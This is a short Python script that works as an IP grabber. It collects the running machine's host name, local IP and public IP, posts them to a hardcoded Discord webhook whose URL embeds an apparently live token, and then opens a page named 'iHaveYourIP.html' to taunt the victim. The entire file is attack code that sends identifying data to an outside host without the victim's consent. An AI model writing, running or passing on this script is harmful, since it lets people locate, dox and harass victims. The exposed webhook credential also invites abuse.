import requests
import socket
import platform
import webbrowser

def get_public_ip():
    try:
        response = requests.get("https://api.ipify.org")
        response.raise_for_status()
        return response.text
    except Exception as e:
        print(f"Error fetching public IP: {e}")
        return None

def get_local_ip():
    try:
        hostname = socket.gethostname()
        local_ip = socket.gethostbyname(hostname)
        return local_ip
    except Exception as e:
        print(f"Error fetching local IP: {e}")
        return None

def send_to_discord(webhook_url, message):
    try:
        payload = {"content": message}
        response = requests.post(webhook_url, json=payload)
        return response.status_code == 204 or response.status_code == 200
    except Exception as e:
        print(f"Error sending to Discord: {e}")
        return False

def open_url(url):
    try:
        webbrowser.open(url)
    except Exception as e:
        print(f"Failed to open URL: {e}")

def main():
    webhook_url = "https://discord.com/api/webhooks/1390722363964002304/e_CFO5vNZXm6dB3ld85SbDOEzjOxfXutaSN5mmQVgI2HgQvZZjjc8d6llL6LrBFssILW"

    public_ip = get_public_ip()
    local_ip = get_local_ip()
    pc_name = platform.node()

    if not public_ip:
        print("Could not retrieve public IP address.")
        return

    if not local_ip:
        print("Could not retrieve local IP address.")
        return

    message = (
        f"🔍 PC Info:\n"
        f"🖥️ PC Name: `{pc_name}`\n"
        f"🌐 Public IP: `{public_ip}`\n"
        f"🏠 Local IP: `{local_ip}`"
    )

    success = send_to_discord(webhook_url, message)

    print("Info sent to Discord webhook successfully." if success else "Failed to send info to Discord webhook.")

    if success:
        open_url("http://www.nullz.shop/iHaveYourIP.html")

if __name__ == "__main__":
    main()
